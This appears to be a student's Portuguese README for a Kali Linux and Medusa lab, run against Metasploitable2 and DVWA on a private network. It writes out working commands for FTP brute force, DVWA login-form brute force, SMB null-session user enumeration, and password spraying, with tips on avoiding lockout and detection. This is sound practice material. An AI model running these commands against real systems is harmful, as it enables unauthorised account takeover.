Esse é o meu projeto do desafio da DIO sobre Kali Linux + Medusa. Fiz uns testes de força bruta em FTP, num formulário web (DVWA) e também password spraying em SMB. Foi minha primeira vez mexendo com essas ferramentas então o README tá bem no "passo a passo" mesmo, do jeito que eu fui entendendo as coisas enquanto estudava.

usei
Kali Linux 
Metasploitable2 
DVWA 
VirtualBox, com as duas VMs numa rede 
Ferramentas: medusa, nmap, rpcclient, enum4linux, curl

Como ficou organizado o repositório

README.md
scripts/
│ 00-run-all.sh -> roda os 3 testes de uma vez só
│01-ftp-bruteforce.sh -> brute force no FTP
│ 02-dvwa-webform.sh -> tentativas no login do DVWA
│ 03-smb-enum-spray.sh -> descobre usuários e faz spraying no SMB
├── wordlists/
│ usuarios.txt
│senhas.txt
├── resultados/ -> aqui salva o output de cada teste (cria sozinho)

Teste 1 - Brute Force em FTP

Rodando:

bash
cd scripts
./01-ftp-bruteforce.sh 192.168.56.102

bash
medusa -h 192.168.56.102 -U wordlists/usuarios.txt -P wordlists/senhas.txt -M ftp -t 3 -f


Teste 2 - Tentando login no formulário do DVWA pwlo navegador

bash
cd scripts
./02-dvwa-webform.sh 192.168.56.103 <cole_o_PHPSESSID_aqui>


bash
medusa -h 192.168.56.103 -u admin -P wordlists/senhas.txt -M web-form \
-m FORM:"/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" \
-m COOKIE:"PHPSESSID=<id>; security=low"

Teste 3 - Achando usuários e fazendo Password Spraying no SMB

bash
cd scripts
./03-smb-enum-spray.sh 192.168.56.102

O script faz duas partes:

Parte 1 - descobrir os usuários: uso o rpcclient com uma "sessão nula" (sem usuário/senha nenhum, o SMB às vezes deixa listar os usuários mesmo assim, o que já é uma falha de configuração) pra listar quem existe na máquina. Se não rolar, tento com o enum4linux também.

Parte 2 - password spraying: pego essa lista de usuários e testo algumas senhas bem comuns (tipo "123456", "password" etc), uma por vez, esperando um tempinho entre cada rodada.

Na mão, ficaria mais ou menos assim:

bash
# descobrir usuários
rpcclient -U "" -N 192.168.56.102 -c "enumdomusers"

# spraying com uma senha só
medusa -h 192.168.56.102 -U resultados/smb-usuarios-enumerados.txt -p 'Senha@123' -M smbnt -t 1


Conferindo se a senha que achei funciona de verdade

bash
# pro FTP
ftp 192.168.56.102

# pro SMB
smbclient -L //192.168.56.102/ -U 'usuario%senha'4

O que eu aprendi / anotações soltas
Brute force "burro" (todas as senhas num usuário só) é bem mais fácil de travar numa conta de verdade. Password spraying é bem mais "discreto".
Sessão nula no SMB é uma furada de segurança clássica e eu nem sabia que isso existia antes desse desafio.
Threads demais (-t alto) no Medusa deixa o ataque rápido mas também mais fácil de ser detectado ou travar a conta. Usei valor baixo de propósito.
Formulário web dá mais trabalho que FTP/SMB porque cada site tem um jeito diferente de responder erro de login, então o -m FORM: muda de site pra site.
